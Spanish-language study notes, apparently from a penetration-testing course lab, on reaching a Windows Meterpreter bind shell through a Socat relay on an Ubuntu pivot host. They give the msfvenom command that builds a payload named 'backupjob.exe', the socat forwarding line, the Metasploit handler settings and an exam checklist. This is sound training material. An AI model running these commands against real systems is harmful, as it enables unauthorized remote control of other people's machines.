
## 1. Concepto

Una **bind shell** es diferente de una **reverse shell**:

- **Reverse shell:** el objetivo Windows inicia una conexión hacia nuestro equipo de ataque.
    
- **Bind shell:** el objetivo Windows abre un puerto a la escucha y nuestro equipo se conecta a él.
    

Podemos utilizar **Socat en un servidor Ubuntu intermedio** para redirigir las conexiones desde nuestro equipo de ataque hasta el puerto de la bind shell del objetivo Windows.

### Flujo de conexión

```
Equipo de ataque
      |
      | Metasploit conecta al puerto 8080
      v
Servidor Ubuntu (Socat)
      |
      | Redirección al puerto 8443
      v
Objetivo Windows (Bind Shell)
```

## 2. Crear el payload de Bind Shell

Generamos un ejecutable para Windows x64 que abrirá una bind shell TCP en el puerto `8443`.

```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

**Parámetros:**

|Parámetro|Descripción|
|---|---|
|`-p windows/x64/meterpreter/bind_tcp`|Payload Meterpreter de tipo bind TCP para Windows x64.|
|`-f exe`|Genera un ejecutable de Windows.|
|`-o backupjob.exe`|Nombre del archivo generado.|
|`LPORT=8443`|Puerto donde escuchará la bind shell.|

Debemos transferir el ejecutable al objetivo Windows y ejecutarlo para que el puerto `8443` quede disponible.

## 3. Configurar la redirección con Socat

En el servidor Ubuntu intermedio, ejecutamos:

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

**Funcionamiento:**

- `TCP4-LISTEN:8080`: escucha conexiones TCP IPv4 en el puerto `8080`.
    
- `fork`: permite gestionar múltiples conexiones creando procesos hijos.
    
- `TCP4:172.16.5.19:8443`: reenvía las conexiones al objetivo Windows en el puerto `8443`.
    

De esta forma, las conexiones dirigidas al puerto `8080` de Ubuntu se redirigen al puerto `8443` de Windows.

## 4. Configurar el handler de Metasploit

En nuestro equipo de ataque, iniciamos Metasploit:

```
msfconsole
```

Seleccionamos el handler:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

**Parámetros importantes:**

|Parámetro|Descripción|
|---|---|
|`payload`|Debe coincidir con el payload utilizado para generar el ejecutable.|
|`RHOST`|Dirección del servidor Ubuntu intermedio, accesible desde el equipo de ataque.|
|`LPORT`|Puerto `8080` donde escucha el redireccionador de Socat.|

> **Importante:** `RHOST` debe ser la dirección del servidor Ubuntu accesible desde el equipo de ataque, tal como aparece en el ejemplo del módulo. `LPORT` debe coincidir con el puerto de escucha de Socat, no con el puerto `8443` de la bind shell de Windows.

## 5. Obtener la sesión Meterpreter

Una vez ejecutado el payload en Windows y establecida la conexión, podemos comprobar la identidad del usuario:

```
meterpreter > getuid
```

Salida de ejemplo:

```
Server username: INLANEFREIGHT\victor
```

## 6. Diferencias entre Reverse Shell y Bind Shell

|Característica|Reverse Shell|Bind Shell|
|---|---|---|
|Quién abre la conexión|El objetivo|El equipo de ataque|
|Quién escucha|El handler de Metasploit|El objetivo|
|Tipo de payload|`reverse_https` o `reverse_tcp`|`bind_tcp`|
|Función de Socat en este escenario|Reenvía la conexión inversa hacia el handler|Redirige la conexión del handler hacia la bind shell|
|Puerto del objetivo|No necesita abrir un listener para recibir la conexión del atacante|Debe escuchar en el puerto configurado, `8443` en el ejemplo|

## 7. Puntos clave para el examen

- Una **bind shell** abre un puerto de escucha en el objetivo.
    
- Socat permite alcanzar esa bind shell a través de un servidor intermedio.
    
- El puerto de escucha de Socat (`8080`) y el puerto de la bind shell (`8443`) son distintos.
    
- El payload del handler debe coincidir con el payload generado mediante `msfvenom`.
    
- `fork` permite a Socat aceptar y gestionar varias conexiones.
    
- El flujo de conexión del ejemplo es:
    

```
Atacante → Ubuntu:8080 → Windows:8443
```

- Si no se establece la sesión, comprueba:
    
    1. Que el ejecutable se haya generado y ejecutado correctamente.
        
    2. Que el payload utilice el puerto `8443`.
        
    3. Que Socat esté escuchando en `8080`.
        
    4. Que la IP de Windows configurada en Socat sea correcta.
        
    5. Que `RHOST` apunte al servidor Ubuntu accesible desde el atacante.
        
    6. Que los puertos y las reglas de red permitan la comunicación.
